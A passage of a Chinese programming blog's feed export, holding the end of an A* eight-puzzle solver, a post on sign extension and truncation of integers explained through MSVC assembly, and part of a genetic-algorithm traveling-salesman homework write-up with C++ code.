			cout <span class="token operator">&lt;&lt;</span> <span class="token string">"step"</span> <span class="token operator">&lt;&lt;</span> cnt <span class="token operator">&lt;&lt;</span> <span class="token string">":  "</span> <span class="token operator">&lt;&lt;</span> str<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl
				<span class="token operator">&lt;&lt;</span> <span class="token string">"        "</span> <span class="token operator">&lt;&lt;</span> str<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token string">"        "</span> <span class="token operator">&lt;&lt;</span>
				str<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl <span class="token operator">&lt;&lt;</span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	<span class="token keyword">void</span> <span class="token function">eightDigitalQues</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> ini<span class="token punctuation">,</span> <span class="token keyword">const</span> string<span class="token operator">&amp;</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		targetStr <span class="token operator">=</span> target<span class="token punctuation">;</span>
		priority_queue<span class="token operator">&lt;</span>state<span class="token operator">></span> open<span class="token punctuation">;</span>
		unordered_set<span class="token operator">&lt;</span>string<span class="token operator">></span> close<span class="token punctuation">;</span>
		unordered_map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span> string<span class="token operator">></span> pre<span class="token punctuation">;</span>
		open<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>ini<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		pre<span class="token punctuation">[</span>ini<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"None"</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>open<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			string n <span class="token operator">=</span> open<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>str<span class="token punctuation">;</span>
			<span class="token keyword">int</span> d <span class="token operator">=</span> open<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>depth<span class="token punctuation">;</span>
			open<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			close<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">int</span> iniInd <span class="token operator">=</span> n<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">int</span> x <span class="token operator">=</span> iniInd <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">,</span> y <span class="token operator">=</span> iniInd <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>
			<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> dir <span class="token operator">:</span> dirs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 尝试选择四个方向</span>
				<span class="token keyword">int</span> nx <span class="token operator">=</span> x <span class="token operator">+</span> dir<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ny <span class="token operator">=</span> y <span class="token operator">+</span> dir<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>nx <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nx <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> ny <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ny <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 满足移动后下标满足条件</span>
					<span class="token keyword">int</span> childInd <span class="token operator">=</span> nx <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> ny<span class="token punctuation">;</span>
					state <span class="token function">childState</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> d <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token function">swapChr</span><span class="token punctuation">(</span>childState<span class="token punctuation">.</span>str<span class="token punctuation">,</span> iniInd<span class="token punctuation">,</span> childInd<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span>close<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>childState<span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 如该状态已加入close表，则跳过</span>
						<span class="token keyword">continue</span><span class="token punctuation">;</span>
					open<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>childState<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 加入满足条件的子状态</span>
					pre<span class="token punctuation">[</span>childState<span class="token punctuation">.</span>str<span class="token punctuation">]</span> <span class="token operator">=</span> n<span class="token punctuation">;</span> <span class="token comment">// 更新前驱</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token function">printPath</span><span class="token punctuation">(</span>pre<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 输出流程</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
string Solution<span class="token double-colon punctuation">::</span>targetStr<span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	Solution S<span class="token punctuation">;</span>
	string ini<span class="token punctuation">,</span> target<span class="token punctuation">;</span>
	cin <span class="token operator">>></span> ini <span class="token operator">>></span> target<span class="token punctuation">;</span>
	S<span class="token punctuation">.</span><span class="token function">eightDigitalQues</span><span class="token punctuation">(</span>ini<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	cin<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>原状态：283164705, 目标状态：123804765</p>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p><img src="/2022/04/27/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8AStar%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E5%85%AB%E6%95%B0%E7%A0%81%E9%97%AE%E9%A2%98/AStar.png"></p>
]]></content>
      <categories>
        <category>人工智能</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>数据结构</tag>
        <tag>人工智能</tag>
      </tags>
  </entry>
  <entry>
    <title>从机器指令的角度看一些位级操作</title>
    <url>/2024/01/06/%E4%BB%8E%E6%9C%BA%E5%99%A8%E6%8C%87%E4%BB%A4%E7%9A%84%E8%A7%92%E5%BA%A6%E7%9C%8B%E4%B8%80%E4%BA%9B%E4%BD%8D%E7%BA%A7%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>C/C++ 中有时会遇到一些位级操作，通常是一些隐式的类型转换，它们往往很难凭借高级语言层面的直觉来理解或记忆。本文旨在分析这些操作对应的汇编代码，从机器指令的角度来理解这类操作。</p>
<span id="more"></span>

<h1 id="补码数转换为更长的无符号数"><a href="#补码数转换为更长的无符号数" class="headerlink" title="补码数转换为更长的无符号数"></a>补码数转换为更长的无符号数</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">short</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">12345</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// -12345 4294954951</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先看以上这个示例，一个短整型数据（2 字节）强制类型转换为无符号整型数据（4 字节）之后，得到的值却是一个看似毫不相关的结果。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> ptr<span class="token punctuation">,</span> size_t sz<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.2x "</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>首先，为了更好地分析这类位级操作，这里编写了一个简单的字节打印函数，通过将指向变量的指针强制类型转换为 <code>unsigned char *</code> ，便可以很方便地通过增加数组下标来实现对每个字节的访问。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">short</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">12345</span><span class="token punctuation">;</span>
	<span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c7 cf</span>
	<span class="token keyword">unsigned</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	<span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// c7 cf ff ff</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>通过打印变量 a 和 b 的位级表示，发现 a 的位级表示为：c7 ff，而 b 的位级表示为 c7 ff ff ff，这表明 b 在位级层面实际上进行了符号扩展（注意此处字节序为<strong>小端表示</strong>，即字节地址由高到低为 ff ff ff c7），再将其解释为无符号类型，用表达式表示就是：<code>unsigned b = (unsigned)(int)a;</code>.</p>
<p>在 MSVC 编译器下对前面的代码进行编译，得到以下代码：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">mov eax, 0ffffcfc7h
mov word ptr [a], ax

movsx eax, word ptr [a]
mov dword ptr [b], eax</code></pre>

<p>将 a 赋值给 b 的指令为 <code>movsx</code>，该指令的作用是将源数据经过<strong>符号扩展</strong>后存入目的地址，相关的指令还有 <code>movzx</code>，作用是将源数据经过<strong>零扩展</strong>后存入目的地址，因此程序实际上是将 a 的比特位符号扩展后再存入 b 中。事实上，要对一个变量进行何种扩展，决定因素是<strong>源数据的类型</strong>，而与目标类型无关，这是 C 语言标准所规定的。</p>
<h1 id="截断补码数"><a href="#截断补码数" class="headerlink" title="截断补码数"></a>截断补码数</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span>
	<span class="token keyword">short</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span> <span class="token comment">// -2147483648 0</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>4 字节的整型转换为 2 字节的短整型，同样产生了令人意想不到的结果。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> a <span class="token operator">=</span> INT32_MIN<span class="token punctuation">;</span>
	<span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 00 00 00 80</span>
	<span class="token keyword">short</span> b <span class="token operator">=</span> a<span class="token punctuation">;</span>
	<span class="token function">showBytes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 00 00</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>由于整型的字节长度大于短整型，因此在类型转换过程中，必然要进行数位的截断，关键在于截断策略的选择。对于无符号数来说，很容易想到直接将高位字节部分截断，因为这样才能保证当整型数值 a 不是太大（小于短整型所能表示的最大数值）时，类型转换后数值保持不变。而根据上述字节打印结果，可以看到补码数值的截断策略与无符号数一致，以下汇编代码清楚地表明了这一点：</p>
<pre class="language-assembly" data-language="assembly"><code class="language-assembly">mov dword ptr [a], 80000000h

mov ax, word ptr [a]
mov word ptr [b], ax</code></pre>

<p>在进行类型转换时，程序只是简单地将变量 a 的一个字（word），即两字节存入 b 中。因此补码数的截断，其本质上还是位级层面的截断，与该补码所表示的数值并无关系，不涉及到任何的算术运算，这就使得在对负数进行截断时，往往产生出乎意料的结果。</p>
]]></content>
      <categories>
        <category>计算机体系结构</category>
      </categories>
      <tags>
        <tag>位运算</tag>
        <tag>计算机体系结构</tag>
      </tags>
  </entry>
  <entry>
    <title>人工智能作业 使用遗传算法解决旅行商问题</title>
    <url>/2022/05/26/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>遗传算法（Genetic Algorithm，GA）最早是由美国的 John holland于20世纪70年代提出,该算法是根据大自然中生物体进化规律而设计提出的。是模拟达尔文生物进化论的自然选择和遗传学机理的生物进化过程的计算模型，是一种通过模拟自然进化过程搜索最优解的方法。本文利用遗传算法解决经典的NP问题——旅行商问题，并加深对该算法的理解。</p>
<span id="more"></span>

<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>有若干个城市，每个城市给定一个坐标，一个旅行商需要经过每个城市各一遍且不能重复经过城市，起点可以任意选择，求旅行商经过所有城市的总距离的最小值及其最优路径。</p>
<h1 id="数据结构与算法设计"><a href="#数据结构与算法设计" class="headerlink" title="数据结构与算法设计"></a>数据结构与算法设计</h1><h2 id="数据结构设计"><a href="#数据结构设计" class="headerlink" title="数据结构设计"></a>数据结构设计</h2><ul>
<li><code>struct point</code></li>
</ul>
<p>从文本提取的城市的坐标数据，包含 id, x, y.</p>
<ul>
<li><code>const int idNum = 100; // 种群个体数</code></li>
</ul>
<p>表示种群的个体数目，即每次迭代所包含的数据的个数。</p>
<ul>
<li><code>const double variProbability = 0.05; // 变异概率</code></li>
</ul>
<p>遗传过程可能导致变异，变异次数 = 变异概率 * 种群个体数。</p>
<ul>
<li><code>vector&lt;point&gt; coords; // 各点坐标</code></li>
</ul>
<p>从文本文件中提取的坐标向量。</p>
<ul>
<li><code>vector&lt;vector&lt;double&gt;&gt; distance; // 各点距离</code></li>
</ul>
<p>两城市之间的距离矩阵，<code>distance[i][j]</code>的值为城市i与城市j的距离。</p>
<ul>
<li><code>vector&lt;vector&lt;int&gt;&gt; route; // 路线种群</code></li>
</ul>
<p>种群向量，每个 <code>route[i]</code> 表示一个个体，即 TSP 问题的一个解路径。</p>
<ul>
<li><code>vector&lt;pair&lt;double, int&gt;&gt; fitness; // 各路线的适应度(适应度，种群下标)</code></li>
</ul>
<p>各路线个体的适应度，<code>fitness[i].second</code> 表示该个体在 route 向量中的下标，即<code>route[fitness[i].second]</code> 的适应度为 <code>fitness[i].first</code>.</p>
<ul>
<li><code>vector&lt;int&gt; bestRoute; // 最优路线</code></li>
</ul>
<p>当前迭代过程中出现过的最优个体。</p>
<ul>
<li><code>double minDistance = INT32_MAX; // 最短路径</code></li>
</ul>
<p>当前迭代过程中出现过的最短路径。</p>
<h2 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h2><ul>
<li><code>void geneticsAlgorithm(const string&amp; path)</code></li>
</ul>
<p>算法总体设计，首先根据指定的path路径读取文本并提取数据于 coords 向量，再根据 coords 数据初始化距离矩阵，并随机生成初始路线。</p>
<p>在迭代循环中，依次执行计算适应度、自然选择、交叉遗传、随机变异操作，并在每 100 次迭代后打印当前最优解。</p>
<ul>
<li><code>vector&lt;point&gt; extraData(const string&amp; path)</code></li>
</ul>
<p>根据指定的 path 路径从文本中提取数据，实现算法为以指定文本文件初始化文件 ifstream 对象 fileStream，并每次用字符串 s 接收 fileStream 输出的值，并使用 <code>stoi()</code> 函数将其转换成 int 类型并存储。循环往复，直到文件末尾。</p>
<ul>
<li><code>void initDistance()</code></li>
</ul>
<p>根据 coords 中的数据初始化城市距离矩阵，算法实现为简单的二重循环+计算，在此不过多赘述。</p>
<ul>
<li><code>void initRoute()</code></li>
</ul>
<p>随机生成初始种群，实现算法为先将序号 <code>0~coords.size()</code> 顺序排序，再使用 <code>random_shuffle()</code> 函数将其打乱顺序作为个体放入 route 中，按此方式生成 idNum 个个体，作为初始种群。</p>
<ul>
<li><code>void updateFitness()</code></li>
</ul>
<p>更新适应度，首先计算各个体 <code>route[i]</code> 的距离总和D，并更新此时的最短距离及最优解，计算适应度为 fitness = 1 / D，即总距离越大，适应度越低，越有可能被淘汰。</p>
<ul>
<li><code>void selectAlgorithm()</code></li>
</ul>
<p>根据个体的适应度进行自然选择，自然选择的算法很多，例如轮盘赌算法等，本实验采用的是最简单的优先级淘汰，即每次淘汰适应度排名后 50% 的个体。</p>
<ul>
<li><code>void crossAlgorithm()</code></li>
</ul>
<p>交叉遗传算法，本算法为遗传算法的核心部分，目的是根据自然选择后的个体之间进行交叉遗传得到新的个体。交叉遗传算法同样有很多，本实验采用的是 Subtour Exchange Crossover 算法，算法原理如下：</p>
<ol>
<li><p>首先随机选取双亲之一 parent1 的基因序列的一段。</p>
</li>
<li><p>依次遍历另一个双亲 parent2 的基因序列，若当前遍历的基因值与步骤1中随机选取的基因段中某个基因值相同，则按基因出现顺序进行交换。</p>
</li>
</ol>
<p><img src="/2022/05/26/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/4.jpg"></p>
<ul>
<li><code>void variationAlgorithm()</code></li>
</ul>
<p>随机变异，实现算法为选取前 <code>idNum * variProbability</code> 个个体随机变异，变异方式为随机选取两个城市进行顺序交换。</p>
<h1 id="算法结果分析"><a href="#算法结果分析" class="headerlink" title="算法结果分析"></a>算法结果分析</h1><h2 id="输入数据"><a href="#输入数据" class="headerlink" title="输入数据"></a>输入数据</h2><p>为一个文本文件 data.txt，每行有三个整数并以空格分隔开，依次为城市编号，城市所在横坐标，城市所在纵坐标。</p>
<h2 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h2><p><img src="/2022/05/26/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/1.png"></p>
<p><img src="/2022/05/26/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/2.png"></p>
<h2 id="输出结果分析"><a href="#输出结果分析" class="headerlink" title="输出结果分析"></a>输出结果分析</h2><p><img src="/2022/05/26/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E4%BD%9C%E4%B8%9A%20%E4%BD%BF%E7%94%A8%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E8%A7%A3%E5%86%B3%E6%97%85%E8%A1%8C%E5%95%86%E9%97%AE%E9%A2%98/3.png"></p>
<p>可见，随着迭代次数的增加，最短路径变化的越来越慢，最终收敛于一个确定的值，至此，可认为算法已经基本找到了最优解。</p>
<p>此外，根据数据不难看出，遗传算法在收敛速度较慢，这是由于种群进化到后期，个体之间的差异越来越小，得到更优个体的概率也越小，越到后期取得的收益越小，因此可以考虑在最优解连续一定次数（如 500 次）时终止算法，并认为此时得到的基本上为最优解。</p>
<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;fstream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">point</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> id<span class="token punctuation">;</span>
	<span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>
	<span class="token function">point</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">id</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">x</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">y</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">TSP</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">private</span><span class="token operator">:</span>
	<span class="token keyword">const</span> <span class="token keyword">int</span> idNum <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token comment">// 种群个体数</span>
	<span class="token keyword">const</span> <span class="token keyword">double</span> variProbability <span class="token operator">=</span> <span class="token number">0.05</span><span class="token punctuation">;</span> <span class="token comment">// 变异概率</span>
	vector<span class="token operator">&lt;</span>point<span class="token operator">></span> coords<span class="token punctuation">;</span> <span class="token comment">// 各点坐标</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">>></span> distance<span class="token punctuation">;</span> <span class="token comment">// 各点距离</span>
	vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> route<span class="token punctuation">;</span> <span class="token comment">// 路线种群</span>
	vector<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">>></span> fitness<span class="token punctuation">;</span> <span class="token comment">// 各路线的适应度(适应度，种群下标)</span>
	vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> bestRoute<span class="token punctuation">;</span> <span class="token comment">// 最优路线</span>
	<span class="token keyword">double</span> minDistance <span class="token operator">=</span> INT32_MAX<span class="token punctuation">;</span> <span class="token comment">// 最短路径</span>

	vector<span class="token operator">&lt;</span>point<span class="token operator">></span> <span class="token function">extraData</span><span class="token punctuation">(</span><span class="token keyword">const</span> string<span class="token operator">&amp;</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		ifstream <span class="token function">fileStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span>point<span class="token operator">></span> res<span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>fileStream<span class="token punctuation">.</span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			string s<span class="token punctuation">;</span>
			fileStream <span class="token operator">>></span> s<span class="token punctuation">;</span>
			id <span class="token operator">=</span> <span class="token function">stoi</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
			fileStream <span class="token operator">>></span> s<span class="token punctuation">;</span>
			x <span class="token operator">=</span> <span class="token function">stoi</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
			fileStream <span class="token operator">>></span> s<span class="token punctuation">;</span>
			y <span class="token operator">=</span> <span class="token function">stoi</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
			res<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		fileStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> res<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">void</span> <span class="token function">initDistance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
